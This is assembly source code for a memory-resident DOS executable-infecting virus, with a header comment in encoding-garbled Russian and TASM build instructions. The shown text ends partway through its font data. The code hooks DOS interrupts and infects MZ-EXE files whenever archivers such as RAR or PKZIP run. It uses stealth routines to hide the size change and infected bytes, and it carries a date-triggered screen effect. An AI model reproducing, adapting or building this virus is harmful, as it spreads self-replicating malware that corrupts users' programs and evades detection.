COMMENT %

  PE-EXE.CRYPT. A very simple non-tsr Win32 virus. Scannes for
  files in the current directory and infects it by appending to
  the last section.

   จเใแ, ชฎโฎเ๋ฉ แฅฉ็แ ฏฅเฅค ขฌจ, ก๋ซ ญฏจแญ ฅ้ฅ ฏฎซ ฃฎค ญงค, ญฎ
ฏฎซญฎแโ์๎ คฎคฅซโ์ จ ฎไฎเฌจโ์ ฅฃฎ ใ ฌฅญ๏ ญ่ซฎแ์ ขเฅฌ๏ โฎซ์ชฎ แฅฉ็แ. โฎโ
ขจเใแ ๏ขซ๏ฅโแ๏ เฅซจงๆจฅฉ คฎขฎซ์ญฎ แโเฎฉ จคฅจ, ญฎ, ขจคจฌฎ จง-ง แซฎฆญฎแโจ
ซฃฎเจโฌ, คเใฃจๅ ขฎฏซฎ้ฅญจฉ ํโฎฉ จคฅจ, ฏฎ ฌฎจฌ คญญ๋ฌ, ญฅโ. โช, ข ็ฅฌ ฆฅ
งชซ๎็ฅโแ๏ ขแ๏ ไจ่ช?  คฅซฎ ข โฎฌ, ็โฎ ขจเใแ ญจ็ฅฃฎ ญ คจแช ญฅ ฏจ่ฅโ
(ง จแชซ๎็ฅญจฅฌ ญจฆฅ ฎฃฎขฎเฅญญ๋ๅ แซใ็ฅข). ฎ ข โชฎฌ แซใ็ฅ ขฎงญจชฅโ
แฏเขฅคซจข๋ฉ ขฎฏเฎแ: ชช ฆฅ โฎฃค ขจเใแ เงฌญฎฆฅโแ๏?  คญญฎฉ เฅซจงๆจจ
ฅฌใ ฏฎฌฎฃ๎โ เๅจขโฎเ๋ (ๅฎโ๏ ฌฎฃใโ ก๋โ์ จ คเใฃจฅ ขเจญโ๋).
   ฅฏฅเ์ ฏฎ ฏฎเ๏คชใ. ญ็ซ ฎโขฅ็ใ ญ โชฎฉ ขฎฏเฎแ: ชช, ญฅ จงฌฅญ๏๏ ไฉซ,
แคฅซโ์ โช, ็โฎก๋ ไฉซ ชงซแ๏ งเฆฅญญ๋ฌ? แโฅฌแ๏ เฅงจคฅญโญฎ จ ฏฅเฅๅขโ๋ขฅฌ
แซฅคใ๎้จฅ ไใญชๆจจ 21-ฃฎ ฏเฅเ๋ขญจ๏:

   - 4Eh, 4Fh (็โฅญจฅ ชโซฎฃฎข)
   - 3Fh (็โฅญจฅ จง ไฉซ)
   - 42h (ใแโญฎขช ใชงโฅซ๏ ข ไฉซฅ)

   ซฅฅ ฌ๋ ข๋ฏฎซญ๏ฅฌ คฅฉแโขจ๏, ฎกเโญ๋ฅ คฅฉแโขจ๏ฌ Stealth-ขจเใแฎข. เจ ็โฅญจจ
ชโซฎฃฎข ใขฅซจ็จขฅฌ ข DTA เงฌฅเ ไฉซ-ฆฅเโข๋ ญ คซจญใ ขจเใแ. เจ ็โฅญจจ จง
ไฉซ ฏเฎขฅเ๏ฅฌ, ฃคฅ ญๅฎคจโแ๏ ใชงโฅซ์ จ, ฅแซจ ฎญ ญๅฎคจโแ๏ ญ MZ-EXE
งฃฎซฎขชฅ (ฌ๋ เกฎโฅฌ โฎซ์ชฎ แ MZ-EXE ไฉซฌจ) จซจ ญ ฏเฅคฏฎซฃฅฌฎฌ ฌฅแโฅ
เแฏฎซฎฆฅญจ๏ ขจเใแ ข ไฉซฅ (ข ญ่ฅฌ แซใ็ฅ ํโฎ แเงใ ฏฎแซฅ ชฎญๆ ไฉซ), โฎ
ฏฎคแโขซ๏ฅฌ CX กฉโ จง MZ-EXE งฃฎซฎขช, ชฎโฎเ๋ฉ โใโ ฆฅ ฃฅญฅเจเใฅฌ (โช ฆฅ,
ชช ํโฎ คฅซ๎โ ฏเจ ฎก๋็ญฎฌ งเฆฅญจจ), จซจ จง ชฎค ขจเใแ แฎฎโขฅโแโขฅญญฎ, ฏฎ
คเฅแใ DS:DX. ฎ ฅแโ์, ฌ๋ งเฆฅฌ ญฅ แฌ ไฉซ,  กใไไฅเ, ข ชฎโฎเ๋ฉ ฅฃฎ ็จโ๎โ
(งเฆฅฌ ไฉซ ข ฏฌ๏โจ). ชจฌ ฎกเงฎฌ, ฏเฎฃเฌฌ, ฏเฎ็จโข่๏ ไฉซ, ฏฎซใ็จโ
ฅฃฎ งเฆฅญญ๋ฌ. ฎซฅฅ คฅโซ์ญฎฅ ฎฏจแญจฅ ซฃฎเจโฌ ฏเจขฎคจโแ๏ ฎโคฅซ์ญฎ.
   แโฅแโขฅญญฎ, ็โฎ ฏฅเฅค โฅฌ, ชช ข๋ฏฎซญ๏โ์ ข๋่ฅฎฏจแญญ๋ฅ คฅฉแโขจ๏, ฌ๋ แญ็ซ
ฏเฎขฅเ๏ฅฌ โจฏ ไฉซ (ฎญ คฎซฆฅญ ก๋โ์ MZ-EXE, ชช ใฆฅ ก๋ซฎ แชงญฎ) จ ฅฃฎ
ฏเจฃฎคญฎแโ์ คซ๏ งเฆฅญจ๏ (ฎโแใโแโขจฅ ฎขฅเซฅฅข),  โชฆฅ คฅซฅฌ ฏเฎขฅเชใ ญ
ฏฎขโฎเญฎฅ งเฆฅญจฅ (ฏเจงญช งเฆฅญญฎแโจ ไฉซ - 6666h ข ฏฎซฅ ชฎญโเฎซ์ญฎฉ
แใฌฌ๋ MZ-EXE งฃฎซฎขช).
   ฅฏฅเ์ แฌฎฅ ฃซขญฎฅ. แฅ, ็โฎ ญฏจแญฎ ข๋่ฅ, ฏเจ ฎก๋็ญ๋ๅ ใแซฎขจ๏ๅ ฎโชซ๎็ฅญฎ
จ ชโจขจเใฅโแ๏ โฎซ์ชฎ โฎฃค, ชฎฃค ฏฎซ์งฎขโฅซ์ งฏใแชฅโ เๅจขโฎเ (RAR, ARJ,
PKZIP จซจ HA). ซ๏ ํโฎฃฎ ขจเใแ ฏฅเฅๅขโ๋ขฅโ ไใญชๆจ๎ 4Bh (งฏใแช ไฉซ). แญฎ,
็โฎ ข เๅจขๅ ไฉซ๋ ฎชฆใโแ๏ งเฆฅญญ๋ฌจ, ข โฎ ขเฅฌ๏ ชช ญ คจแชฅ ฎญจ ฎแโญใโแ๏
ญฅโเฎญใโ๋ฌจ.
   ฎฌจฌฎ ขแฅฃฎ ฏเฎ็ฅฃฎ, ขจเใแ งเฆฅโ ใชงญญ๋ฅ ข๋่ฅ เๅจขโฎเ๋ ฏเจ จๅ
งฏใแชฅ (ํโฎ ชช เง โฎโ ฅคจญแโขฅญญ๋ฉ แซใ็ฉ, ชฎฃค ขจเใแ ็โฎ-โฎ ฏจ่ฅโ ญ
คจแช). เจ งเฆฅญจจ เๅจขโฎเฎข ขจเใแ ฎกเกโ๋ขฅโ โเจกใโ "ฎซ์ชฎ ็โฅญจฅ",
ญฅ จงฌฅญ๏ฅโ โเจกใโฎข จ ขเฅฌฅญจ แฎงคญจ๏ ไฉซ,  โชฆฅ ญฅ ฃซ๎็จโ ญ ง้จ้ฅญญ๋ๅ
ฎโ งฏจแจ คจแชฅโๅ.
   เฎ๏ขซฅญจฅ: 18 ฌ๏ ขจเใแ ใแโญขซจขฅโ ญ int 1Ch แขฎฉ ฎกเกฎโ็จช, ชฎโฎเ๋ฉ
แฎงคฅโ ญจฌๆจฎญญ๋ฉ ํไไฅชโ แ ญฅชฎโฎเ๋ฌจ ่เจไโฌจ.

                                  DJ Sadovnikov (http://i.am/djsad), 26.09.2000

 ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

               ฎฌฏจซจเฎขโ์ แ ฏฎฌฎ้์๎ TASM 4.1+

                  tasm /m archiver.asm
                  tlink /3 /x archiver.obj
                  del archiver.obj


               ฉซ๋ จง เๅจข:

                  archiver.asm 23700 (จแๅฎคญจช ขจเใแ)
                  archiver.exe  2100 (กจญเญจช ขจเใแ)
                  archiver.doc  3300 (ฎฏจแญจฅ ซฃฎเจโฌ)
%









;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

		.286
Code		segment	use16
		assume	cs:Code, ds:Code
		org	0

		mov	ah, 9
		mov	dx, offset Msg+100h
		int	21h
		mov	ax, 4C00h
		int	21h

Msg		db	'Virus has started...$'

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                                  
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Virus:		pusha
		push	ds es

		call	Entry
Entry:		pop	si
		sub	si, Entry-Virus


;[เฎขฅเ๏ฅฌ ญซจ็จฅ ขจเใแ ข ฏฌ๏โจ]

		mov	ax, 0ABCDh
		int	21h
		cmp	ax, 0DCBAh
		je	Exit


;[ชฎเ็จขฅฌ คซจญใ โฅชใ้ฅฃฎ กซฎช ฏฌ๏โจ]

		mov	ax, ds
		dec	ax
		mov	ds, ax
		mov	bx, ds:[3]
		sub	bx, MemSize/16+2
		mov	ah, 4Ah
		int	21h
		jc	Exit


;[ฅเฅแโขซ๏ฅฌ int 21h ญ int 65h]

		mov	ax, 3521h
		int	21h
		mov	ax, 2565h
		mov	dx, bx
		push	es
		pop	ds
		int	21h


;[๋คฅซ๏ฅฌ ฏฌ๏โ์ คซ๏ ขจเใแ]

		mov	ah, 48h
		mov	bx, MemSize/16+1
		int	21h
		jc	Exit
		mov	es, ax


;[ฎฌฅ็ฅฌ กซฎช ฏฌ๏โจ ชช แจแโฅฌญใ๎ ฎกซแโ์]

		dec	ax
		mov	ds, ax
		mov	ds:[1], word ptr 8


;[ฎฏจเใฅฌ ขจเใแ ข ข๋คฅซฅญญใ๎ ฏฌ๏โ์]

		cld
		push	cs
		pop	ds
		xor	di, di
		mov	cx, CodeSize
		push	si
		rep	movsb
		pop	si


;[แโญขซจขฅฌ ญฎข๋ฉ ฎกเกฎโ็จช int 21h]

		mov	ax, 2521h
		mov	dx, Int21h-Virus
		push	es
		pop	ds
		int	21h


;[เฎขฅเ๏ฅฌ แจแโฅฌญใ๎ คโใ]

		mov	ax, 0807h
		out	70h, al
		in	al, 71h
		xchg	ah, al
		out	70h, al
		in	al, 71h
		cmp	ax, 1805h
		jne	Exit


;[ฎๅเญ๏ฅฌ คเฅแ แโเฎฃฎ ฎกเกฎโ็จช int 1Ch]

		mov	ax, 351Ch
		int	65h
		mov	ds:[Ofs1Ch-Virus], bx
		mov	ds:[Seg1Ch-Virus], es


;[แโญขซจขฅฌ ญฎข๋ฉ ฎกเกฎโ็จช int 1Ch]

		mov	ax, 251Ch
		mov	dx, Int1Ch-Virus
		int	65h


;[โคฅฌ ใฏเขซฅญจฅ งเฆฅญญฎฉ ฏเฎฃเฌฌฅ]

Exit:		pop	es ds
		mov	ax, ds
		add	ax, 10h
		add	cs:[OldCS+0-Virus+si], ax
		add	cs:[OldSS+1-Virus+si], ax
		popa
		jmp	$+2


		cli
OldSS:		mov	sp, 0
		mov	ss, sp
OldSP:		mov	sp, 0
		sti

		db	0EAh
OldIP		dw	0
OldCS		dw	0

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                            INT 1Ch
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Int1Ch:		pusha
		push	ds es

		push	cs
		pop	ds
		push	0B800h
		pop	es

		cmp	ds:[Flag1-Virus], byte ptr 0
		jne	WaitTic

		mov	dx, 3C4h
		mov	al, 2
		out	dx, al
		inc	dx
		mov	al, 4
		out	dx, al
		dec	dx
		out	dx, al
		inc	dx
		out	dx, al
		mov	dx, 3CEh
		mov	al, 6
		out	dx, al
		inc	dx
		mov	al, 0Ch
		out	dx, al

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

		mov	ax, Font1-Virus
		mov	bx, Font1Ofs-Virus
		mov	di, 32*'.'
		call	Font

		mov	ax, Font2-Virus
		mov	bx, Font2Ofs-Virus
		mov	di, 32*'\'
		call	Font

		mov	ax, Font3-Virus
		mov	bx, Font3Ofs-Virus
		mov	di, 32*','
		call	Font

		mov	ax, Font4-Virus
		mov	bx, Font4Ofs-Virus
		mov	di, 32*':'
		call	Font

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

		mov	dx, 3CEh
		mov	al, 6
		out	dx, al
		inc	dx
		mov	al, 0DEh
		out	dx, al
		mov	dx, 3C4h
		mov	al, 4
		out	dx, al
		inc	dx
		mov	al, 3
		out	dx, al
		dec	dx
		mov	al, 2
		out	dx, al
		inc	dx
		mov	al, 3
		out	dx, al

WaitTic:	not	byte ptr ds:[Flag1-Virus]
		pop	es ds
		popa

		db	0EAh
Ofs1Ch		dw	0
Seg1Ch		dw	0  


Font:		mov	si, ds:[bx]
		mov	cx, 15
		cld
		rep	movsb
		cmp	si, bx
		jne	L1
		mov	si, ax
L1:		mov	ds:[bx], si
		ret


Flag1		db	0

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                            INT 21h
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Int24h:		mov	al, 3
		iret

Int21h:		cmp	ax, 0ABCDh
		jne	NotTest
		mov	ax, 0DCBAh
		iret

NotTest:	cmp	ah, 4Bh
		je	Func4B
		cmp	cs:[Flag2-Virus], byte ptr 0
		je	Quit

		cmp	ah, 4Eh
		je	Func4E
		cmp	ah, 4Fh
		je	Func4E

		cmp	bx, 4
		jbe	Quit

		cmp	ah, 3Fh
		je	Func3F
		cmp	ax, 4202h
		je	Func42

Quit:		int	65h
		jc	QuitSTC

QuitCLC:	push	bp
		mov	bp, sp
		and	[bp+6], byte ptr 11111110b
		pop	bp
		iret

QuitSTC:	push	bp
		mov	bp, sp
		or	[bp+6], byte ptr 00000001b
		pop	bp
		iret

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                            
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Func4B:		pusha
		mov	cs:[Flag2-Virus], byte ptr 0


;[แโญขซจขฅฌ SI ญ ญ็ซฎ จฌฅญ ไฉซ]

		mov	di, dx
		mov	si, di
Loop1:		cmp	ds:[di], byte ptr '\'
		jne	L2
		mov	si, di
		inc	si
L2:		inc	di
		cmp	ds:[di], byte ptr 0
		jne	Loop1


;[เฎขฅเ๏ฅฌ จฌ๏ ไฉซ]

		mov	ax, ds:[si]
		and	ax, 0DFDFh
		mov	di, Arhivat-Virus
		call	CmpStr
		jnc	NotArhiv


;[เฆฅฌ เๅจขโฎเ]

		not	byte ptr cs:[Flag2-Virus]
		call	Infect

NotArhiv:	popa
		jmp	Quit

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                        
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Func42:		call	TestFile
		jc	Quit

		add	dx, CodeSize
		adc	cx, 0
		jmp	Quit

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                             
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Func3F:		jcxz	Quit

		call	TestFile
		jc	Quit

		int	65h
		jc	QuitSTC

		push	ax
		push	bx
		call	Exec3F
		pop	bx
		pop	ax

		jmp	QuitCLC

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                             
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Func4E:		int	65h
		jc	QuitSTC

		pusha
		push	ds
		push	es


;[ฎๅเญ๏ฅฌ คเฅแ ฎกเกฎโ็จช Int 24h]

		mov	ax, 3524h
		int	65h
		push	es
		push	bx


;[แโญขซจขฅฌ แขฎฉ ฎกเกฎโ็จช Int 24h]

		call	Set24h


;[ฎซใ็ฅฌ คเฅแ DTA]

		mov	ah, 2Fh
		int	65h
		jc	Rest24h
		push	es
		pop	ds


;[ฉคฅญญ๏ งฏจแ์ - คจเฅชโฎเจ๏ จซจ ฌฅโช โฎฌ?]

		test	ds:[bx+15h], byte ptr 00011000b
		jnz	Rest24h
		mov	cs:[OldBX+1-Virus], bx


;[โชเ๋ขฅฌ ญฉคฅญญ๋ฉ ไฉซ]

		mov	ax, 3D00h
		lea	dx, [bx+1Eh]
		int	65h
		jc	Rest24h
		xchg	ax, bx


;[เฎขฅเ๏ฅฌ ฅฃฎ ฏเจฃฎคญฎแโ์]

		call	TestFile


;[ชเ๋ขฅฌ ไฉซ]

		pushf
		mov	ah, 3Eh
		int	65h
		popf
		jc	Rest24h


;[ขฅซจ็จขฅฌ เงฌฅเ ไฉซ ญ คซจญใ ขจเใแ]

OldBX:		mov	bx, 0
		add	ds:[bx+1Ah], CodeSize
		adc	ds:[bx+1Ch], word ptr 0


;[ฎแแโญขซจขฅฌ แโเ๋ฉ ฎกเกฎโ็จช Int 24h]

Rest24h:	mov	ax, 2524h
		pop	dx
		pop	ds
		int	65h

		pop	es
		pop	ds
		popa
		jmp	QuitCLC

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                              
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Infect:		push	ds
		push	es


;[ฎๅเญ๏ฅฌ ขฅชโฎเ Int24h]

		mov	ax, 3524h
		int	65h
		push	es
		push	bx


;[แโญขซจขฅฌ แขฎฉ ฎกเกฎโ็จช Int 24h]

		push	ds dx
		call	Set24h
		pop	dx ds


;[ฎๅเญ๏ฅฌ โเจกใโ๋ ไฉซ]

		mov	ax, 4300h
		int	65h
		jc	Fault
		push	cx
		push	dx
		push	ds


;[กญใซ๏ฅฌ โเจกใโ๋ ไฉซ]

		mov	ax, 4301h
		xor	cx, cx
		int	65h
		jc	RestAttr


;[โชเ๋ขฅฌ ไฉซ]

		mov	ax, 3D02h
		int	65h
		jc	RestAttr
		xchg	bx, ax


;[ฎๅเญ๏ฅฌ ขเฅฌ๏ จ คโใ แฎงคญจ๏ ไฉซ]

		mov	ax, 5700h
		int	65h
		jc	Close
		push	dx
		push	cx


;[เฎขฅเ๏ฅฌ ฏเจฃฎคญฎแโ์ ไฉซ]

		call	TestFile
		jc	RestTime


;[ฏจแ๋ขฅฌ ญฎข๋ฉ งฃฎซฎขฎช]

		mov	ah, 40h
		mov	cx, 18h
		mov	dx, Header-Virus
		push	cs
		pop	ds
		int	65h
		jc	RestTime


;[แโญขซจขฅฌ ใชงโฅซ์ ข ชฎญฅๆ ไฉซ]

		mov	al, 2
		call	Seek
		jc	RestTime


;[ฏจแ๋ขฅฌ ชฎค ขจเใแ]

		mov	ah, 40h
		mov	cx, CodeSize
		xor	dx, dx
		int	65h


;[ฎแแโญขซจขฅฌ คโใ จ ขเฅฌ๏ แฎงคญจ๏ ไฉซ]

RestTime:	mov	ax, 5701h
		pop	cx
		pop	dx
		int	65h


;[ชเ๋ขฅฌ ไฉซ]

Close:		mov	ah, 3Eh
		int	65h


;ฎแแโญขซจขฅฌ โเจกใโ๋ ไฉซ]

RestAttr:	mov	ax, 4301h
		pop	ds
		pop	dx
		pop	cx
		int	65h


;[ฎแแโญขซจขฅฌ ขฅชโฎเ Int 24h]

Fault:		mov	ax, 2524h
		pop	dx
		pop	ds
		int	65h

		pop	es
		pop	ds
		ret

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                    
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

TestFile:	pusha
		push	ds

		push	cs
		pop	ds


;[ฎๅเญ๏ฅฌ โฅชใ้ใ๎ ฏฎงจๆจ๎ ข ไฉซฅ]

		mov	al, 1
		call	Seek
		jc	Error
		mov	ds:[CurPos-Virus], ax
		mov	ds:[CurPos+2-Virus], dx


;[ฎๅเญ๏ฅฌ เงฌฅเ ไฉซ]

		mov	al, 2
		call	Seek
		jc	Error
		mov	ds:[FSize-Virus], ax
		mov	ds:[FSize+2-Virus], dx


;[แโญขซจขฅฌ ใชงโฅซ์ ข ญ็ซฎ ไฉซ]

		mov	al, 0
		call	Seek
		jc	Error


;[็จโ๋ขฅฌ งฃฎซฎขฎช EXE-ไฉซ]

		mov	ah, 3Fh
		mov	cx, 18h
		mov	dx, Header-Virus
		int	65h
		jc	Error


;[แโญขซจขฅฌ ใชงโฅซ์ ญ 3Ch กฉโ ฎโ ญ็ซ ไฉซ]

		mov	ax, 4200h
		xor	cx, cx
		mov	dx, 3Ch
		int	65h
		jc	Error


;[็จโ๋ขฅฌ คเฅแ NewEXE งฃฎซฎขช]

		mov	ah, 3Fh
		mov	cx, 4
		mov	dx, Temp-Virus
		int	65h
		jc	Error


;[แโญขซจขฅฌ ใชงโฅซ์ ญ NewEXE งฃฎซฎขฎช]

		mov	ax, 4200h
		mov	dx, ds:[Temp-Virus]
		mov	cx, ds:[Temp+2-Virus]
		int	65h
		jc	Error


;[็จโ๋ขฅฌ ฏฅเข๋ฅ คข กฉโ NewEXE งฃฎซฎขช]

		mov	ah, 3Fh
		mov	cx, 2
		mov	dx, Temp-Virus
		int	65h
		jc	Error


;[ฎแแโญขซจขฅฌ โฅชใ้ใ๎ ฏฎงจๆจ๎ ข ไฉซฅ]

		mov	ax, 4200h
		mov	dx, ds:[CurPos-Virus]
		mov	cx, ds:[CurPos+2-Virus]
		int	65h
		jnc	NoError


;[๋ๅฎคจฌ จง ฏฎคฏเฎฃเฌฌ๋]

Error:		stc
		pop	ds
		popa
		ret


;[เฎขฅเ๏ฅฌ โจฏ ไฉซ จ ฅฃฎ งเฆฅญญฎแโ์]

NoError:	cmp	ds:[Header-Virus], 'ZM'
		jne	Error
		cmp	ds:[Header+12h-Virus], 6666h
		je	Error


;[แซจ NewEXE งฃฎซฎขฎช ฏเจแใโแโขใฅโ, โฎ ข๋ๅฎคจฌ]

		mov	di, NewEXE-Virus
		mov	ax, ds:[Temp-Virus]
		call	CmpStr
		jc	Error


;[ฎคฅเฆจโ ซจ ไฉซ ฎขฅเซฅจ]

		call	GetFSize
		call	Into512
		cmp	ds:[Header+4-Virus], ax
		jne	Error
		cmp	ds:[Header+2-Virus], dx
		jne	Error


;[๋็จแซ๏ฅฌ คซจญใ ไฉซ แ ขจเใแฎฌ]

		call	GetFSize
		add	ax, CodeSize
		adc	dx, 0
		call	Into512
		mov	ds:[Header+4-Virus], ax
		mov	ds:[Header+2-Virus], dx


;[ฎๅเญ๏ฅฌ SS, SP, CS, IP]

		mov	ax, ds:[Header+0Eh-Virus]
		mov	ds:[OldSS+1-Virus], ax
		mov	ax, ds:[Header+10h-Virus]
		mov	ds:[OldSP+1-Virus], ax
		mov	ax, ds:[Header+16h-Virus]
		mov	ds:[OldCS-Virus], ax
		mov	ax, ds:[Header+14h-Virus]
		mov	ds:[OldIP-Virus], ax


;[ฎเเฅชโจเใฅฌ โฎ็ชใ ขๅฎค จ คเฅแ แโฅช]

		call	GetFSize
		mov	cx, 16
		div	cx
		sub	ax, ds:[Header+08h-Virus]
		mov	ds:[Header+16h-Virus], ax
		mov	ds:[Header+14h-Virus], dx
		mov	ds:[Header+0Eh-Virus], ax
		mov	ds:[Header+10h-Virus], CodeSize+100h


;[แโญขซจขฅฌ ฏเจงญช งเฆฅญจ๏ ไฉซ]

		mov	ds:[Header+12h-Virus], 6666h
		clc
		pop	ds
		popa
		ret

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                            
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

		.386

Exec3F:		pushad
		movzx	ecx, cx
		movzx	edx, dx

		mov	eax, cs:[CurPos-Virus]
		sub	eax, cs:[FSize-Virus]

		mov	ebx, eax
		add	ebx, ecx

		mov	ebp, 18h
		sub	ebp, cs:[CurPos-Virus]

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

		cmp	eax, large CodeSize
		jg	A06

		cmp	eax, 0
		jle	A01
		mov	esi, edx
		mov	edi, eax
		cmp	ebx, large CodeSize
		jg	A03
		jmp	A04

A01:		cmp	ebp, 0
		jge	A02
		mov	esi, edx
		sub	esi, eax
		xor	edi, edi
		cmp	ebx, large CodeSize
		jg	A07
		cmp	ebx, 0
		jg	A08
		jmp	A06

A02:		mov	esi, edx
		mov	edi, Header-Virus
		add	edi, cs:[CurPos-Virus]
		cmp	ebx, large CodeSize
		jg	A09
		cmp	ebx, 0
		jg	A10
		cmp	ecx, ebp
		jg	A12
		jmp	A05

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

A03:		mov	ecx, CodeSize
		sub	ecx, eax
A04:		call	SetNewPos
A05:		call	Store
A06:		popad
		ret

A07:		mov	ecx, CodeSize
		jmp	A04

A08:		mov	ecx, ebx
		jmp	A04

A09:		mov	ecx, ebp
		call	Store
		mov	ecx, CodeSize
		jmp	A11

A10:		mov	ecx, ebp
		call	Store
		mov	ecx, ebx
A11:		mov	esi, edx
		sub	esi, eax
		xor	edi, edi
		jmp	A04

A12:		mov	ecx, ebp
		jmp	A05

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

		.286

Store:		jcxz	NoStore
		push	ax
Loop2:		mov	al, cs:[di]
		mov	ds:[si], al
		inc	si
		inc	di
		loop	Loop2
		pop	ax
NoStore:	ret


SetNewPos:	pusha
		mov	bp, sp
		add	[bp+36h], cx
		mov	ax, 4201h
		mov	bx, [bp+34h]
		mov	dx, cx
		xor	cx, cx
		int	65h
		popa
		ret

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                                  
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

GetFSize:	mov	ax, ds:[FSize-Virus]
		mov	dx, ds:[FSize+2-Virus]
		ret


Into512:	mov	cx, 512
		div	cx
		or	dx, dx
		jz	$+3
		inc	ax
		ret


Seek:		mov	ah, 42h
		xor	cx, cx
		xor	dx, dx
		int	65h
		ret


CmpStr:		mov	cx, 4
Loop3:		cmp	cs:[di], ax
		jne	L3
		stc
		ret
L3:		inc	di
		inc	di
		loop	Loop3
		clc
		ret


Set24h:		mov	ax, 2524h
		mov	dx, Int24h-Virus
		push	cs
		pop	ds
		int	65h
		ret

;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ










;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;                                 
;ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

Font1		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00111100b
		db	01000010b
		db	00000000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	01111110b
		db	10000001b
		db	00000000b
		db	00111100b
		db	01000010b
		db	00000000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	01111110b
		db	10000001b
		db	00000000b
		db	00111100b
		db	01000010b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	01111110b
		db	10000001b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b

Font1Ofs	dw	Font1-Virus

Font2		db	00000000b
		db	00000000b
		db	00000000b
		db	10000000b
		db	11000000b
		db	11100000b
		db	01110000b
		db	00111000b
		db	00011100b
		db	00001110b
		db	00000110b
		db	00000010b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00011000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00000010b
		db	00000110b
		db	00001110b
		db	00011100b
		db	00111000b
		db	01110000b
		db	11100000b
		db	11000000b
		db	10000000b
		db	00000000b
		db	00000000b
		db	00000000b

		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	11111111b
		db	11111111b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b
		db	00000000b

